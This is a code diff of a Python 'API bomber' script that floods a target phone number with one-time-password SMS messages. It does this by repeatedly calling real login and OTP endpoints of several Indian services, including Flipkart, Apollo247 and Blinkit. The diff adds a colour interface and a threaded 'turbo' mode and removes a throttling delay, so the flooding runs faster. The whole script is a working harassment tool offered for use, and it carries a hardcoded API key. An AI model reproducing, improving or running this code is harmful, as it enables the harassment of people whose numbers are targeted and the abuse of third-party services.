@@ -7,6 +7,7 @@ import threading
 G = "\033[92m" # Green
 R = "\033[91m" # Red
 Y = "\033[93m" # Yellow
+C = "\033[96m" # Cyan
 W = "\033[0m"  # White
 
 success_count = 0
@@ -15,12 +16,10 @@ failed_count = 0
 # --- 1. RESEARCHED API DATABASE ---
 def get_apis(target):
     return [
-        # --- PREVIOUS WORKING APIs ---
         {"name": "Housing", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": target}},
         {"name": "ConfirmTkt", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/register", "params": {"newOtp": "true", "mobileNumber": target}},
         {"name": "Flipkart", "method": "POST", "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", "json": {"loginId": "+91" + target}},
         
-        # --- NEW RESEARCHED APIs ---
         {
             "name": "Mamaearth_Gokwik",
             "method": "POST",
@@ -33,10 +32,10 @@ def get_apis(target):
             "method": "POST",
             "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
             "json": {"loginType": "PATIENT", "mobileNumber": "+91" + target},
-            "headers": {"X-Apollo-Pre-Auth-Key": "d8e788e0-4c4c-4e8c-8c8c-4c4c4e8c8c8c", "Origin": "https://www.apollo247.com"} # Key updated to dummy if old expired
+            "headers": {"X-Apollo-Pre-Auth-Key": "d8e788e0-4c4c-4e8c-8c8c-4c4c4e8c8c8c", "Origin": "https://www.apollo247.com"}
         },
         {
-            "name": "Blinkit_New",
+            "name": "Blinkit",
             "method": "POST",
             "url": "https://blinkit.com/v1/user/otp/send",
             "json": {"phone": target},
@@ -51,11 +50,10 @@ def get_apis(target):
         }
     ]
 
-# --- 2. MASTER SENDER FUNCTION ---
+# --- 2. SENDER FUNCTION ---
 def send_otp(api, session, common_headers):
     global success_count, failed_count
     try:
-        # Merge common headers with API specific headers
         current_headers = common_headers.copy()
         if "headers" in api:
             current_headers.update(api["headers"])
@@ -67,26 +65,35 @@ def send_otp(api, session, common_headers):
         
         if res.status_code in [200, 201, 202]:
             success_count += 1
-            print(f"{G}[+] SUCCESS: {api['name']} - OTP Triggered!{W}")
+            print(f"{G}[+] SUCCESS: {api['name']}{W}")
         else:
             failed_count += 1
-            # print(f"{Y}[-] FAILED: {api['name']} ({res.status_code}){W}")
     except:
         failed_count += 1
 
-# --- 3. MAIN INTERFACE ---
+# --- 3. MAIN UI & LOGIC ---
 def main():
     os.system("clear")
-    print(f"{G}========================================")
-    print("      🚀 RESEARCH MASTER BOT v19.0     ")
-    print(f"========================================{W}\n")
+    print(f"{C}========================================{W}")
+    print(f"{G}      🚀 ADVANCE API BOMBER v20.0       {W}")
+    print(f"{C}========================================{W}\n")
     
+    # OLD STYLE INPUTS (ALAG-ALAG LINES)
+    print(f"{Y}--- Enter Target Info ---{W}")
     target = input(f"{G}Enter Target Number: {W}")
-    limit = int(input(f"{G}Enter SMS Limit: {W}"))
+    limit = input(f"{G}Enter SMS Limit    : {W}")
     
-    print(f"\n{Y}Select Mode: 1. Serial (Stable) | 2. Threading (Turbo){W}")
-    mode = input("Choice: ")
+    print(f"\n{Y}--- Select Speed Mode ---{W}")
+    print(f"{C}1. Serial Mode (Safe & Slow){W}")
+    print(f"{C}2. Threading Mode (Fast/Turbo){W}")
+    mode = input(f"{G}Choice: {W}")
 
+    # Validations
+    if not target or not limit:
+        print(f"{R}\n[!] Error: Number ya Limit nahi dali!{W}")
+        return
+    
+    limit = int(limit)
     common_headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
         "Accept": "application/json",
@@ -94,11 +101,12 @@ def main():
     }
 
     bot_session = requests.Session()
-    print(f"\n{Y}[*] Starting attack using 7 High-Value APIs...{W}\n")
+    print(f"\n{Y}[*] Attack Started on: {C}{target}{W}\n")
     
     sent = 0
     while sent < limit:
         apis = get_apis(target)
+        
         if mode == "1":
             # Serial Mode
             for api in apis:
@@ -115,15 +123,18 @@ def main():
                 t.start()
                 threads.append(t)
                 sent += 1
-                time.sleep(0.2)
             for t in threads: t.join()
-            time.sleep(2) # IP Protection Gap
+            time.sleep(2) # Ban protection
 
-    print(f"\n{G}--- FINAL REPORT ---")
-    print(f"Total Success: {success_count}")
-    print(f"Total Failed : {failed_count}")
-    print(f"====================={W}")
+    print(f"\n{C}========================================{W}")
+    print(f"{G}           ATTACK FINISHED             {W}")
+    print(f"{C}========================================{W}")
+    print(f"{G}Total Successful: {success_count}{W}")
+    print(f"{R}Total Failed    : {failed_count}{W}")
+    print(f"{C}========================================{W}")
 
 if __name__ == "__main__":
-    try: main()
-    except KeyboardInterrupt: print(f"\n{R}Stopped by User.{W}")
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Attack Stopped by User.{W}")
